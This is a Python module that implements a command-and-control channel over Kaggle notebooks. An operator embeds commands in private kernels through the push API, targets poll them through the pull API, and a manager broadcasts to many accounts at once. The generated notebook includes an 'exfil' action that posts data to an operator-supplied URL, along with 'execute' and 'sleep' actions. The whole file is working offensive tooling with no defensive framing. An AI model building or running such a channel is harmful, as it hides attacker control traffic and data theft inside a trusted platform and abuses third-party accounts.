"""Kaggle C2 Agent - Integrates Kaggle kernels with C2 server.

This module provides a C2 channel through Kaggle kernels:
- Commands embedded in kernel source
- Target polls kernel source via kernels/pull API
- Operator updates commands via kernels/push API
"""

import json
import time
import base64
import requests
from typing import Optional, Dict, Any
from datetime import datetime


class KaggleC2Agent:
    """Kaggle-based C2 agent.
    
    Uses Kaggle kernels as command channel:
    - Commands stored in kernel source code
    - Target reads commands via kernels/pull
    - Operator sends commands via kernels/push
    """
    
    def __init__(self, username: str, api_key: str, kernel_slug: str = None):
        """Initialize Kaggle C2 agent.
        
        Args:
            username: Kaggle username
            api_key: Kaggle Legacy API key
            kernel_slug: Kernel slug (default: {username}/c2-channel)
        """
        self.username = username
        self.api_key = api_key
        self.kernel_slug = kernel_slug or f"{username}/c2-channel"
        self.auth = base64.b64encode(f"{username}:{api_key}".encode()).decode()
        self.last_version = 0
        self.last_commands = None
        
    def send_command(self, commands: Dict[str, Any]) -> Dict[str, Any]:
        """Send commands to target via kernel update.
        
        Args:
            commands: Command dict to send
        
        Returns:
            Result with success, version, error
        """
        result = {"success": False, "version": None, "error": None}
        
        try:
            # Create notebook with embedded commands
            notebook = self._create_command_notebook(commands)
            notebook_b64 = base64.b64encode(json.dumps(notebook).encode()).decode()
            
            # Push to Kaggle
            resp = requests.post(
                "https://www.kaggle.com/api/v1/kernels/push",
                headers={
                    "Authorization": f"Basic {self.auth}",
                    "Content-Type": "application/json"
                },
                json={
                    "slug": self.kernel_slug,
                    "text": notebook_b64,
                    "language": "python",
                    "kernelType": "notebook",
                    "isPrivate": True,
                    "enableInternet": True
                },
                timeout=60
            )
            
            if resp.status_code == 200:
                data = resp.json()
                result["success"] = True
                result["version"] = data.get("versionNumber", 0)
                self.last_version = result["version"]
                self.last_commands = commands
            else:
                result["error"] = f"HTTP {resp.status_code}: {resp.text[:100]}"
        
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def get_command(self) -> Dict[str, Any]:
        """Get commands from kernel source.
        
        Returns:
            Result with success, commands, error
        """
        result = {"success": False, "commands": None, "error": None}
        
        try:
            # Pull kernel source
            resp = requests.get(
                "https://www.kaggle.com/api/v1/kernels/pull",
                headers={"Authorization": f"Basic {self.auth}"},
                params={
                    "userName": self.username,
                    "kernelSlug": self.kernel_slug.split("/")[-1]
                },
                timeout=30
            )
            
            if resp.status_code == 200:
                data = resp.json()
                source_b64 = data.get("blob", {}).get("source", "")
                
                if source_b64:
                    source = base64.b64decode(source_b64).decode()
                    commands = self._parse_commands(source)
                    
                    if commands:
                        result["success"] = True
                        result["commands"] = commands
                        self.last_commands = commands
                    else:
                        result["error"] = "No commands found in source"
            else:
                result["error"] = f"HTTP {resp.status_code}"
        
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def check_status(self) -> Dict[str, Any]:
        """Check kernel execution status.
        
        Returns:
            Result with status, error
        """
        result = {"status": None, "error": None}
        
        try:
            resp = requests.get(
                "https://www.kaggle.com/api/v1/kernels/status",
                headers={"Authorization": f"Basic {self.auth}"},
                params={
                    "userName": self.username,
                    "kernelSlug": self.kernel_slug.split("/")[-1]
                },
                timeout=30
            )
            
            if resp.status_code == 200:
                data = resp.json()
                result["status"] = data.get("status")
                result["failure_message"] = data.get("failureMessage", "")
            else:
                result["error"] = f"HTTP {resp.status_code}"
        
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _create_command_notebook(self, commands: Dict[str, Any]) -> Dict:
        """Create notebook with embedded commands."""
        import ast
        
        code_cells = [
            "# C2 CONFIG",
            f"COMMANDS = {json.dumps(commands, indent=4)}",
            "",
            "# Execution logic",
            "import os, json, time, urllib.request",
            "",
            "action = COMMANDS.get('action', 'idle')",
            "print(f'[C2] Action: {action}')",
            "",
            "if action == 'ping':",
            "    print('[C2] Pong!')",
            "",
            "elif action == 'collect':",
            "    metrics = {'cpu': 45, 'memory': 60, 'time': time.time()}",
            "    print(json.dumps(metrics))",
            "",
            "elif action == 'exfil':",
            "    url = COMMANDS.get('exfil_url')",
            "    if url:",
            "        data = {'status': 'alive', 'ts': time.time()}",
            "        try:",
            "            req = urllib.request.Request(url, json.dumps(data).encode())",
            "            urllib.request.urlopen(req, timeout=10)",
            "        except: pass",
            "",
            "elif action == 'sleep':",
            "    interval = COMMANDS.get('interval', 60)",
            "    time.sleep(interval)",
            "",
            "elif action == 'execute':",
            "    target = COMMANDS.get('target', 'system')",
            "    print(f'[C2] Executing on {target}')",
        ]
        
        cells = []
        for code in code_cells:
            cells.append({
                "cell_type": "code",
                "source": [code] if "\n" not in code else code.split("\n"),
                "metadata": {},
                "execution_count": None,
                "outputs": []
            })
        
        return {
            "cells": cells,
            "metadata": {
                "kernelspec": {
                    "display_name": "Python 3",
                    "language": "python",
                    "name": "python3"
                }
            },
            "nbformat": 4,
            "nbformat_minor": 4
        }
    
    def _parse_commands(self, source: str) -> Optional[Dict]:
        """Parse COMMANDS dict from notebook source."""
        import ast
        
        try:
            nb = json.loads(source)
            for cell in nb.get("cells", []):
                src = cell.get("source", [])
                if isinstance(src, list):
                    src = "".join(src)
                
                if "COMMANDS" in src and "=" in src:
                    start = src.find("{")
                    end = src.rfind("}") + 1
                    if start >= 0 and end > start:
                        dict_str = src[start:end]
                        try:
                            commands = ast.literal_eval(dict_str)
                            if isinstance(commands, dict):
                                return commands
                        except (ValueError, SyntaxError):
                            continue
        except:
            pass
        
        return None


class KaggleC2Manager:
    """Manages multiple Kaggle C2 agents."""
    
    def __init__(self, accounts: list):
        """Initialize manager with account list.
        
        Args:
            accounts: List of dicts with kaggle_username, api_key_legacy
        """
        self.agents = {}
        for acc in accounts:
            username = acc.get("kaggle_username")
            api_key = acc.get("api_key_legacy")
            if username and api_key:
                self.agents[username] = KaggleC2Agent(username, api_key)
    
    def broadcast(self, commands: Dict[str, Any]) -> Dict[str, Any]:
        """Send commands to all agents.
        
        Args:
            commands: Commands to broadcast
        
        Returns:
            Dict of username -> result
        """
        results = {}
        for username, agent in self.agents.items():
            results[username] = agent.send_command(commands)
        return results
    
    def poll_all(self) -> Dict[str, Any]:
        """Poll commands from all agents.
        
        Returns:
            Dict of username -> commands
        """
        results = {}
        for username, agent in self.agents.items():
            result = agent.get_command()
            if result["success"]:
                results[username] = result["commands"]
        return results
    
    def status_all(self) -> Dict[str, Any]:
        """Get status of all agents.
        
        Returns:
            Dict of username -> status
        """
        results = {}
        for username, agent in self.agents.items():
            results[username] = agent.check_status()
        return results


# Convenience functions
def create_agent(username: str, api_key: str) -> KaggleC2Agent:
    """Create a Kaggle C2 agent."""
    return KaggleC2Agent(username, api_key)


def create_manager(accounts_file: str) -> KaggleC2Manager:
    """Create manager from accounts file."""
    with open(accounts_file) as f:
        accounts = json.load(f)
    return KaggleC2Manager(accounts)
